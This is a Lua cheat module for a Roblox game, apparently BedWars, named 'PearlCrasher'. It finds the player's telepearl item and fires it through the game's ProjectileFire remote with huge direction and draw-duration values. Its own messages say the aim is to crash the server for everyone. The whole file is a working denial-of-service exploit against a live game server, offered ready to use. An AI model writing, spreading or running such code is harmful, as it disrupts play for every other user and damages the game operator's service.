local PearlCrasher = {}

PearlCrasher.Name = "PearlCrasher"
PearlCrasher.Enabled = false

local replicated = game:GetService("ReplicatedStorage")
local projectileRemote = {CallServerAsync = function() end}

task.spawn(function()
    projectileRemote = replicated.rbxts_include.node_modules["@rbxts"].net.out._NetManaged.ProjectileFire
end)

local rayCheck = RaycastParams.new()
rayCheck.RespectCanCollide = true

local function firePearl(pos, dir, item)
    local threwPearl = projectileRemote:CallServerAsync(
        item,
        'telepearl',
        'telepearl',
        pos,
        pos,
        dir,
        '9U3ZAYNE',
        {
            shotId = '2XKTHZ4I',
            drawDurationSec = 9e9
        },
        workspace:GetServerTimeNow()
    )

    return threwPearl
end

PearlCrasher.Run = function()
    PearlCrasher.Enabled = not PearlCrasher.Enabled

    if PearlCrasher.Enabled then
        print("✅ PearlCrasher Enabled")

        local char = game.Players.LocalPlayer.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            local root = char.HumanoidRootPart

            -- Find telepearl
            local pearl = nil
            for _, item in replicated.Inventories[game.Players.LocalPlayer.Name]:GetChildren() do
                if item.Name:find("telepearl") then
                    pearl = item
                    break
                end
            end

            if not pearl then
                print("PearlCrasher: Missing telepearl")
                PearlCrasher.Enabled = false
                return
            end

            rayCheck.FilterDescendantsInstances = {game.Players.LocalPlayer.Character}
            local ray = workspace:Raycast(root.Position, Vector3.new(0, 500, 0), rayCheck)
            if ray then
                print("PearlCrasher: You are under a block")
                PearlCrasher.Enabled = false
                return
            end

            print("PearlCrasher: Crashing please wait...")

            local s = firePearl(
                root.Position,
                Vector3.new(9e7, 9e9, 9e6),
                pearl
            )

            PearlCrasher.Enabled = false

            print("PearlCrasher: " .. (s and "Successfully crashed everyone" or "Failed to crash"))
        end
    else
        print("❌ PearlCrasher Disabled")
    end
end

return PearlCrasher